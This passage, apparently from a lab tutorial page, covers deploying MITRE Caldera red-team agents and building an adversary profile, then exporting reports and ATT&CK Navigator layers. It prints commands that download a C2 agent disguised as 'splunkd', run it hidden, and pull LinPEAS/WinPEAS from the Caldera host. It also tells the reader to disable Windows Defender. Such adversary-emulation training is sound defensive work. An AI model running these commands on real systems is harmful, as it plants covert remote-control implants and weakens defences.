+<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">"file:sandcat.go"</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">"platform:linux"</span><span class="w"> </span><span class="nv">$server</span>/file/download<span class="w"> </span>&gt;<span class="w"> </span>splunkd<span class="p">;</span>
+<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>splunkd<span class="p">;</span>
+<a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>./splunkd<span class="w"> </span>-server<span class="w"> </span><span class="nv">$server</span><span class="w"> </span>-group<span class="w"> </span>red<span class="w"> </span>-v
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2011.png" data-desc-position="bottom"><img alt="image.png" src="image%2011.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2012.png" data-desc-position="bottom"><img alt="image.png" src="image%2012.png"></a></p>
+<p>After running the commands on the Linux client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2013.png" data-desc-position="bottom"><img alt="image.png" src="image%2013.png"></a></p>
+<h3 id="deploying-windows-agent"><strong>Deploying Windows Agent</strong></h3>
+<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Windows'. <strong>On Windows client, disable Windows Defender.</strong> Copy and paste the commands into the PowerShell terminal of the Windows client.</p>
+<p>For example:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nv">$server</span><span class="p">=</span><span class="s2">"http://10.0.0.100:8888"</span><span class="p">;</span>
+<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nv">$url</span><span class="p">=</span><span class="s2">"$server/file/download"</span><span class="p">;</span>
+<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="nv">$wc</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span>
+<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="nv">$wc</span><span class="p">.</span><span class="n">Headers</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="s2">"platform"</span><span class="p">,</span><span class="s2">"windows"</span><span class="p">);</span>
+<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="nv">$wc</span><span class="p">.</span><span class="n">Headers</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="s2">"file"</span><span class="p">,</span><span class="s2">"sandcat.go"</span><span class="p">);</span>
+<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="nv">$data</span><span class="p">=</span><span class="nv">$wc</span><span class="p">.</span><span class="n">DownloadData</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="nb">get-process</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">modules</span><span class="p">.</span><span class="n">filename</span> <span class="o">-like</span> <span class="s2">"C:\Users\Public\splunkd.exe"</span><span class="p">}</span> <span class="p">|</span> <span class="nb">stop-process</span> <span class="o">-f</span><span class="p">;</span>
+<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="nb">rm </span><span class="n">-force</span> <span class="s2">"C:\Users\Public\splunkd.exe"</span> <span class="n">-ea</span> <span class="n">ignore</span><span class="p">;</span>
+<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="no">[io.file]</span><span class="p">::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"C:\Users\Public\splunkd.exe"</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span>
+<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">splunkd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ArgumentList</span> <span class="s2">"-server $server -group red"</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span><span class="p">;</span>
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2014.png" data-desc-position="bottom"><img alt="image.png" src="image%2014.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2015.png" data-desc-position="bottom"><img alt="image.png" src="image%2015.png"></a></p>
+<p>After running the commands on the Windows client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2016.png" data-desc-position="bottom"><img alt="image.png" src="image%2016.png"></a></p>
+<h3 id="verifying-access-to-agents"><strong>Verifying Access to Agents</strong></h3>
+<p>Under Plugins, navigate to Access and select your Linux and Windows agents. You will see the actions defined in Bootstrap and Deadman Abilities completed on each client, along with their status (success or failed). </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2017.png" data-desc-position="bottom"><img alt="image.png" src="image%2017.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2018.png" data-desc-position="bottom"><img alt="image.png" src="image%2018.png"></a></p>
+<h3 id="creating-a-new-adversary-profile"><strong>Creating a New Adversary Profile</strong></h3>
+<p>Under Campaigns, navigate to Adversaries. Click 'New Profile', then edit the Adversary name and description (e.g., 'Red Haast Eagle'; 'This is our kill chain'). Click 'Done'.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2019.png" data-desc-position="bottom"><img alt="image.png" src="image%2019.png"></a></p>
+<p>Click Add Ability.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2020.png" data-desc-position="bottom"><img alt="image.png" src="image%2020.png"></a></p>
+<p>Search and select Check Python.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2021.png" data-desc-position="bottom"><img alt="image.png" src="image%2021.png"></a></p>
+<p>Click Check Python to Edit Ability.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2022.png" data-desc-position="bottom"><img alt="image.png" src="image%2022.png"></a></p>
+<p>Verify that executors for Linux and Windows are available, as configured previously.</p>
+<p>Add the Abilities for ‘Check Go’ and 'Check Chrome'. Repeat the process as needed. Click Save.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2023.png" data-desc-position="bottom"><img alt="image.png" src="image%2023.png"></a></p>
+<h3 id="creating-custom-abilities"><strong>Creating Custom Abilities</strong></h3>
+<p>Navigate to abilities and click Create an Ability.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2024.png" data-desc-position="bottom"><img alt="image.png" src="image%2024.png"></a></p>
+<p>Put following details:</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Run LinPEAS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Description</td>
+<td>Run LinPEAS to enumerate host for privilege escalation.</td>
+</tr>
+<tr>
+<td>Tactic</td>
+<td>discovery</td>
+</tr>
+<tr>
+<td>Technique ID</td>
+<td>T1083</td>
+</tr>
+<tr>
+<td>Technique Name</td>
+<td>File and Directory Discovery</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2025.png" data-desc-position="bottom"><img alt="image.png" src="image%2025.png"></a></p>
+<p>Click Add Executor and put following details and click Create:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>sh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>wget http://10.0.0.100:8000/linpeas.sh -O /dev/shm/linpeas.sh; sh /dev/shm/linpeas.sh</td>
+</tr>
+<tr>
+<td>Timeout</td>
+<td>300</td>
+</tr>
+<tr>
+<td>Cleanup</td>
+<td>rm -rf /dev/shm/linpeas.sh</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2026.png" data-desc-position="bottom"><img alt="image.png" src="image%2026.png"></a></p>
+<p>Repeat the process for Creating an ability for winPEAS.</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Run WinPEAS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Description</td>
+<td>Run WinPEAS to enumerate host for privilege escalation.</td>
+</tr>
+<tr>
+<td>Tactic</td>
+<td>discovery</td>
+</tr>
+<tr>
+<td>Technique ID</td>
+<td>T1083</td>
+</tr>
+<tr>
+<td>Technique Name</td>
+<td>File and Directory Discovery</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2027.png" data-desc-position="bottom"><img alt="image.png" src="image%2027.png"></a></p>
+<p>Add windows executor with following details and click Create:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>windows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>psh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>Invoke-WebRequest -Uri "http://10.0.0.100:8000/winpeas.exe" -OutFile "C:\Windows\Temp\winpeas.exe";</td>
+</tr>
+<tr>
+<td>Start-Process -FilePath "C:\Windows\Temp\winpeas.exe" -NoNewWindow -Wait</td>
+<td>Tee-Object -FilePath "C:\Windows\Temp\notes.txt"</td>
+</tr>
+<tr>
+<td>Timeout</td>
+<td>300</td>
+</tr>
+<tr>
+<td>Cleanup</td>
+<td>Remove-Item -Path "C:\Windows\Temp\winpeas.exe" -Force</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2028.png" data-desc-position="bottom"><img alt="image.png" src="image%2028.png"></a></p>
+<h3 id="downloading-linpeas-and-winpeas"><strong>Downloading LinPEAS and WinPEAS</strong></h3>
+<p>Since we configured our agents to download LinPEAS and WinPEAS from the Caldera VM’s web server (10.0.0.100), we need to download the tools and host them on a web server.
+On the Caldera VM, connect to the internet and download LinPEAS. Then, modify its permissions to allow execution by running the following commands:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="nb">cd</span><span class="w"> </span>~
+<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>wget<span class="w"> </span>https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh
+</code></pre></div>
+<p>Download <strong>WinPEAS</strong> and output it as <code>winpeas.exe</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="nb">cd</span><span class="w"> </span>~
+<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>wget<span class="w"> </span>https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe<span class="w"> </span>-O<span class="w"> </span>winpeas.exe
+</code></pre></div>
+<p>Start a Python web server to serve the downloaded tools:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2029.png" data-desc-position="bottom"><img alt="image.png" src="image%2029.png"></a></p>
+<h3 id="adding-custom-abilities"><strong>Adding Custom Abilities</strong></h3>
+<p>Navigate to Adversaries and add the ‘Run LinPEAS’ and ‘Run WinPEAS’ abilities to your Adversary profile. Click Save.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2030.png" data-desc-position="bottom"><img alt="image.png" src="image%2030.png"></a></p>
+<h3 id="creating-an-operation"><strong>Creating an Operation</strong></h3>
+<p>Navigate to Operations and click ‘New Operation.’</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2031.png" data-desc-position="bottom"><img alt="image.png" src="image%2031.png"></a></p>
+<p>Name the operation and select your newly created adversary profile. The default setting for obfuscators is plain-text, but other options, such as Base64, are available. Click Start.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2032.png" data-desc-position="bottom"><img alt="image.png" src="image%2032.png"></a></p>
+<p>The operation will start and execute the abilities we configured on the Linux and Windows agents. Wait until the operation returns a status for all abilities. This process may take some time. </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2033.png" data-desc-position="bottom"><img alt="image.png" src="image%2033.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2034.png" data-desc-position="bottom"><img alt="image.png" src="image%2034.png"></a></p>
+<h3 id="adding-a-manual-command"><strong>Adding a Manual Command</strong></h3>
+<p>To add a manual command, click <strong>Manual Command</strong>, select the agent, choose the executor, and enter the command. Click Add Cimmand.</p>
+<p>For example, to view the output of <strong>LinPEAS</strong> on an Ubuntu agent using <strong>sh</strong>, enter the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>cat<span class="w"> </span>/dev/shm/linpeas.out
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2035.png" data-desc-position="bottom"><img alt="image.png" src="image%2035.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2036.png" data-desc-position="bottom"><img alt="image.png" src="image%2036.png"></a></p>
+<h3 id="generating-an-operation-report-json"><strong>Generating an Operation Report (JSON)</strong></h3>
+<p>The "Run LinPEAS" and "Run WinPEAS" abilities cause an error when generating a full JSON report, as the report contains a null value. For demonstration purposes, an adversary profile named "Red Haast Eagle v2" has been created, excluding both abilities. Additionally, a new operation called "Cyber Defence Kit v2" has been created and successfully completed using the Red Haast Eagle v2 adversary profile to demonstrate the functionality of downloading an operation report in JSON format. Navigate to operations, select Cyber Defence Kit v2 and click Download Report. </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2037.png" data-desc-position="bottom"><img alt="image.png" src="image%2037.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2038.png" data-desc-position="bottom"><img alt="image.png" src="image%2038.png"></a></p>
+<p>You can include agent output unless it contains sensitive data. Reports can be downloaded in JSON (Full Report), Event Logs, or CSV format. Select Full Report and click Download.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2039.png" data-desc-position="bottom"><img alt="image.png" src="image%2039.png"></a></p>
+<p>Use the jq to view to JSON report by running:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>cat<span class="w"> </span><span class="s1">'Cyber Defence Kit_report.json'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.<span class="w"> </span><span class="p">|</span><span class="w"> </span>less
+</code></pre></div>
+<p>Search for chrome by running:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>/chrome
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2040.png" data-desc-position="bottom"><img alt="image.png" src="image%2040.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2041.png" data-desc-position="bottom"><img alt="image.png" src="image%2041.png"></a></p>
+<h3 id="generating-a-pdf-report"><strong>Generating a PDF Report</strong></h3>
+<p>The debrief plugin provides a centralised view of campaign analytics, operation metadata, visuals, techniques, tactics, and discovered facts. Navigate to Debrief under Plugins and select your newly created operation. Click Download PDF Report.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2042.png" data-desc-position="bottom"><img alt="image.png" src="image%2042.png"></a></p>
+<p>Select Report Sections that you want to include, then click Download.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2043.png" data-desc-position="bottom"><img alt="image.png" src="image%2043.png"></a></p>
+<p>This generates a well-formatted PDF report.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2044.png" data-desc-position="bottom"><img alt="image.png" src="image%2044.png"></a></p>
+<h3 id="generating-a-layer-for-mitre-attck-navigator"><strong>Generating a Layer for MITRE ATT&amp;CK Navigator</strong></h3>
+<p>For demonstration purposes, the <strong>internet has been connected</strong> temporarily to access <strong>MITRE ATT&amp;CK Navigator</strong>. There is a way to host <strong>MITRE ATT&amp;CK Navigator</strong> in an air-gapped environment, which will be covered in a separate section later. </p>
+<p>Click Compass plugin. Select your newly created adversary profile and click Generate Layer. This will automatically download <code>layer.json</code> file. </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2045.png" data-desc-position="bottom"><img alt="image.png" src="image%2045.png"></a></p>
+<p>Click Open Existing Layer, then select Upload from Local. Choose layer.json and dismiss the warning for an outdated layer.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2046.png" data-desc-position="bottom"><img alt="image.png" src="image%2046.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2047.png" data-desc-position="bottom"><img alt="image.png" src="image%2047.png"></a></p>
+<p>This highlights the discovery techniques in ATT&amp;CK Navigator used by our newly created adversary profile.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2048.png" data-desc-position="bottom"><img alt="image.png" src="image%2048.png"></a></p>
+<h2 id="references"><strong>References</strong></h2>
+<ul>
+<li><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a></li>
+<li><a href="https://caldera.mitre.org/">https://caldera.mitre.org/</a></li>
+<li><a href="https://caldera.readthedocs.io/en/latest/index.html">https://caldera.readthedocs.io/en/latest/index.html</a></li>
+<li><a href="https://www.youtube.com/watch?v=ZSDhDV48DUs&amp;list=PLA3BVzhXP1c0DwPORcVdjpEukfRmgcsOk">https://www.youtube.com/watch?v=ZSDhDV48DUs&amp;list=PLA3BVzhXP1c0DwPORcVdjpEukfRmgcsOk</a></li>
+<li><a href="https://youtu.be/Z9QdgD8dG24?si=U0mLaJk9a0DSBkWY">https://youtu.be/Z9QdgD8dG24?si=U0mLaJk9a0DSBkWY</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer">
+        
+          
+          <a href="../auroralite/auroralite.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Aurora Lite">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Aurora Lite
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../navigator/navigator.html" class="md-footer__link md-footer__link--next" aria-label="Next: MITRE ATT&amp;CK Navigator">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                MITRE ATT&amp;CK Navigator
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2024–2026 <a href="https://github.com/cyberdefencekit" target="_blank" rel="noopener">Cyber Defence Kit by Joseph Jee</a>
+
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/cyberdefencekit" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M202.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M496 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"></path></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.annotate", "content.code.copy", "content.tabs.link", "header.autohide", "announce.dismiss", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "navigation.expand", "search.highlight", "search.share", "search.suggest", "toc.integrate"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
